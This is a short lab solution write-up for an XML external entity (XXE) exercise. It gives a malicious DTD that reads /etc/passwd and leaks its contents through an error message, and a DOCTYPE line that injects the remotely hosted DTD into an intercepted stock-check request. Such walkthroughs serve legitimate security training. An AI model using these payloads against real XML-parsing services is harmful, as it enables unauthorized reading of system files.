![image](https://github.com/udayk01/Web-Security/assets/52235763/518c1161-599c-4b1f-9b05-f5c21d4a7755)

## Solution:

> Click "Go to exploit server" and save the following malicious DTD file on your server:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/11d8fb23-5fbc-487c-9ee9-c704c51b17bc)

>> When imported, this page will read the contents of /etc/passwd into the file entity, and then try to use that entity in a file path.

> Click "View exploit" and take a note of the URL for your malicious DTD.

![image](https://github.com/udayk01/Web-Security/assets/52235763/611a1daf-861b-4e37-a2ba-2281e9f6b0af)

> url: ```https://exploit-0a3900030434bd3883caaf00014f008f.exploit-server.net/exploit```

> You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

![image](https://github.com/udayk01/Web-Security/assets/52235763/a38c826b-a0e9-4844-b5ed-de7ee86dc777)

> Insert the following external entity definition in between the XML declaration and the stockCheck element:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/da0be2cb-1942-4be6-a101-45e2ce00ca98)

>> You should see an error message containing the contents of the /etc/passwd file.

> Lab Solved

![image](https://github.com/udayk01/Web-Security/assets/52235763/141a205e-f50d-42ab-b0ed-266d3d312120)
